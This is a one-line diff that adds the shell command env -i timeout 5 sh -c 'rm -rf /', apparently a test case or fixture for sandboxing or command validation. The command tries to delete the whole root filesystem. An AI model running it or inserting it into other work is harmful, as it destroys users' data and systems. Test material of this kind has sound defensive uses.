@@ -1,0 +1,1 @@
+env -i timeout 5 sh -c 'rm -rf /'
